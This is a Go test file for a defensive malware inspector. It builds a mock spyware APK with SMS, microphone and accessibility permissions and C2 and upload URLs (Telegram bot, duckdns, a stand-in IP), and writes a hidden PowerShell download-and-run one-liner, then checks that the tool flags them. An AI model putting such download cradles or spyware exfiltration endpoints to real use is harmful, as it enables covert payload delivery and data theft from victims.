package main

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func utf16le(s string) []byte {
	var b []byte
	for _, c := range []byte(s) {
		b = append(b, c, 0)
	}
	return append(b, 0, 0)
}

func zipBytes(t *testing.T, comment string, files map[string][]byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	if comment != "" {
		_ = w.SetComment(comment)
	}
	for _, n := range []string{"AndroidManifest.xml", "classes.dex", "META-INF/CERT.RSA"} {
		if d, ok := files[n]; ok {
			f, _ := w.Create(n)
			f.Write(d)
		}
	}
	for n, d := range files {
		if n == "AndroidManifest.xml" || n == "classes.dex" || n == "META-INF/CERT.RSA" {
			continue
		}
		f, _ := w.Create(n)
		f.Write(d)
	}
	w.Close()
	return buf.Bytes()
}

// A GitHub-style zip holding a spy app: the reverse view must find the servers, the abilities,
// the author's certificate and the GitHub commit.
func TestInspectZipWithSpyApk(t *testing.T) {
	key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	tpl := &x509.Certificate{SerialNumber: big.NewInt(7), Subject: pkix.Name{CommonName: "Android Debug", Organization: []string{"Android"}}, NotBefore: time.Now().Add(-48 * time.Hour), NotAfter: time.Now().Add(24 * 365 * time.Hour)}
	der, err := x509.CreateCertificate(rand.Reader, tpl, tpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	manifest := utf16le("android.permission.READ_SMS")
	manifest = append(manifest, utf16le("android.permission.RECORD_AUDIO")...)
	manifest = append(manifest, utf16le("android.permission.BIND_ACCESSIBILITY_SERVICE")...)
	manifest = append(manifest, utf16le("com.evil.spyware.app")...)
	dex := []byte("dex\n035\x00 Landroid/telephony/SmsManager; Ldalvik/system/DexClassLoader; " +
		"https://api.telegram.org/bot123:ABC/sendMessage http://203.0.113.9:8080/upload.php https://example.duckdns.org/c2 " +
		"http://schemas.android.com/apk/res/android 4.0.30319.0")
	apk := zipBytes(t, "", map[string][]byte{"AndroidManifest.xml": manifest, "classes.dex": dex, "META-INF/CERT.RSA": append([]byte{0x30, 0x80, 1, 2}, der...)})
	outer := zipBytes(t, "0123456789abcdef0123456789abcdef01234567", map[string][]byte{"Spy-master/app/base.apk": apk, "Spy-master/README.md": []byte("see https://github.com/someone/Spy")})
	p := filepath.Join(t.TempDir(), "Spy-master.zip")
	if err := os.WriteFile(p, outer, 0o600); err != nil {
		t.Fatal(err)
	}
	plat := inPlat{Zone: []string{"[ZoneTransfer]", "ZoneId=3", "ReferrerUrl=https://github.com/someone/Spy", "HostUrl=https://codeload.github.com/someone/Spy/zip/refs/heads/master"}}
	r := inspectFile(p, plat)
	if !r.Exists || r.Kind != "archive" || !strings.Contains(r.KindText, "Android") {
		t.Fatalf("kind: %q %q", r.Kind, r.KindText)
	}
	hasHost := func(h, sev string) bool {
		for _, s := range r.Servers {
			if s.Host == h && s.Sev == sev {
				return true
			}
		}
		return false
	}
	for h, sev := range map[string]string{"api.telegram.org": "high", "203.0.113.9": "med", "example.duckdns.org": "high"} {
		if !hasHost(h, sev) {
			t.Errorf("server %s (%s) not found: %+v", h, sev, r.Servers)
		}
	}
	for _, s := range r.Servers {
		if s.Host == "schemas.android.com" || s.Host == "4.0.30319.0" {
			t.Errorf("noise reported as server: %s", s.Host)
		}
	}
	caps := ""
	for _, c := range r.Caps {
		caps += c.T + "|"
	}
	for _, w := range []string{"text messages", "microphone", "Accessibility", "hidden code", "throw-away developer key"} {
		if !strings.Contains(caps, w) {
			t.Errorf("ability %q missing from %s", w, caps)
		}
	}
	kv := func(list []inKV, k string) string {
		for _, e := range list {
			if e.K == k {
				return e.V
			}
		}
		return ""
	}
	if kv(r.Creator, "Packed from GitHub commit") != "0123456789abcdef0123456789abcdef01234567" {
		t.Errorf("commit missing: %+v", r.Creator)
	}
	if !strings.Contains(kv(r.Creator, "App signed by"), "Android Debug") {
		t.Errorf("certificate missing: %+v", r.Creator)
	}
	if kv(r.Creator, "App package name") != "com.evil.spyware.app" {
		t.Errorf("package: %q", kv(r.Creator, "App package name"))
	}
	if kv(r.Source, "GitHub project") != "someone/Spy" || !strings.Contains(kv(r.Source, "Downloaded from"), "codeload.github.com") {
		t.Errorf("source: %+v", r.Source)
	}
	if r.Risk != "high" || len(r.Bad) == 0 || r.SHA256 == "" || r.MD5 == "" {
		t.Errorf("verdict: %s bad=%d sha=%s", r.Risk, len(r.Bad), r.SHA256)
	}
}

func TestInspectMissingFile(t *testing.T) {
	r := inspectFile(filepath.Join(t.TempDir(), "gone.zip"), inPlat{})
	if r.Exists || r.Summary == "" {
		t.Fatalf("%+v", r)
	}
}

func TestInspectScriptAndPasswordZip(t *testing.T) {
	d := t.TempDir()
	p := filepath.Join(d, "x.ps1")
	os.WriteFile(p, []byte("powershell -WindowStyle Hidden -EncodedCommand AAAA; (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')"), 0o600)
	r := inspectFile(p, inPlat{})
	if r.Kind != "script" || len(r.Caps) < 3 || len(r.Servers) != 1 || r.Servers[0].Host != "198.51.100.7" {
		t.Fatalf("%+v", r)
	}
}

// A real Windows program (built here) is read: kind, build facts, and no panic on odd headers.
func TestInspectPE(t *testing.T) {
	d := t.TempDir()
	src := filepath.Join(d, "m.go")
	os.WriteFile(src, []byte("package main\nfunc main(){ println(\"http://203.0.113.50/x\") }\n"), 0o600)
	exe := filepath.Join(d, "m.exe")
	cmd := exec.Command("go", "build", "-o", exe, src)
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "GOFLAGS=-mod=mod", "CGO_ENABLED=0")
	cmd.Dir = d
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Skip("cannot build a Windows test program here: ", string(out))
	}
	r := inspectFile(exe, inPlat{})
	if r.Kind != "program" || !strings.Contains(r.KindText, "Windows") {
		t.Fatalf("%q %q", r.Kind, r.KindText)
	}
	found := false
	for _, s := range r.Servers {
		found = found || s.Host == "203.0.113.50"
	}
	if !found {
		t.Errorf("server inside the program not found: %+v", r.Servers)
	}
}

func TestSplitContainerAndOrigin(t *testing.T) {
	o, i := splitContainer(`C:\Users\J\Documents\Noobspy-master.zip->Noobspy-master\app\factory\base.apk->classes.dex`)
	if o != `C:\Users\J\Documents\Noobspy-master.zip` || i != `Noobspy-master\app\factory\base.apk->classes.dex` {
		t.Fatalf("%q %q", o, i)
	}
	if o, i := splitContainer(`C:\a\b.exe`); o != `C:\a\b.exe` || i != "" {
		t.Fatal("plain path changed")
	}
	og := threatOrigin(rawThreat{Proc: "chrome.exe", User: `PC\J`, DSrc: "download scan", Web: `C:\x.zip|https://codeload.github.com/a/b/zip/refs/heads/master|https://github.com/a/b|pid:12`}, `C:\x.zip`, "base.apk")
	if og == nil || og.URL == "" || og.Ref != "https://github.com/a/b" || og.By != "chrome.exe" || !strings.Contains(og.Text, "codeload.github.com") || !strings.Contains(og.Text, "chrome.exe") {
		t.Fatalf("%+v", og)
	}
	if threatOrigin(rawThreat{}, `C:\a.exe`, "") != nil {
		t.Fatal("empty record must not invent an origin")
	}
}

// One failing protection must not hide the others, and "on" only comes from what Windows reported.
func TestHardenReportIsReadBack(t *testing.T) {
	h := hardenOut{Items: []protRes{
		{ID: "rtp", State: "on"}, {ID: "sigs", State: "off", Err: "No internet connection to download updates"},
		{ID: "asr", State: "partial", Detail: "15 of 18 rules active"}, {ID: "tamper", State: "off"}, {ID: "pua", State: "unknown"},
	}}
	h.fill()
	if got := h.summary(); got != "1 of 5 confirmed on" {
		t.Fatal(got)
	}
	if !h.Items[0].OK || h.Items[1].OK || h.Items[2].OK || h.Items[4].OK {
		t.Fatalf("%+v", h.Items)
	}
	if !strings.Contains(h.Items[1].problem(), "internet") || !strings.Contains(h.Items[2].problem(), "partly") {
		t.Fatalf("%q / %q", h.Items[1].problem(), h.Items[2].problem())
	}
}

func TestDeleteOwn(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("CK_SEC_DIR", filepath.Join(dir, "store"))
	secDB = &secStore{}
	p := filepath.Join(dir, "Noobspy-master.zip")
	os.WriteFile(p, []byte("PK\x03\x04junk"), 0o600)
	f := &secFinding{ID: "f1", Kind: "threat", Title: "Trojan:AndroidOS/X", Path: p, Inner: `app\base.apk->classes.dex`, Score: 80}
	f.Actions = actionsFor(f)
	has := map[string]bool{}
	for _, a := range f.Actions {
		has[a.ID] = a.Main
	}
	if !has["delete"] || has["defender"] {
		t.Fatalf("a threat with a file should offer Delete it myself as the main action: %+v", f.Actions)
	}
	out := applyFix(context.Background(), f, "delete")
	if !out.OK || !strings.Contains(out.Msg, "everything inside") {
		t.Fatalf("%+v", out)
	}
	if _, err := os.Stat(p); !os.IsNotExist(err) {
		t.Fatal("file still there")
	}
	// already gone is fine, not an error
	if out := applyFix(context.Background(), f, "delete"); !out.OK || !strings.Contains(out.Msg, "already gone") {
		t.Fatalf("%+v", out)
	}
	// system files are never deleted
	if out := deleteOwn(context.Background(), &secFinding{Path: `C:\Windows\System32\cmd.exe`}, secRecord{}); out.OK {
		t.Fatal("system file deletion was allowed")
	}
}
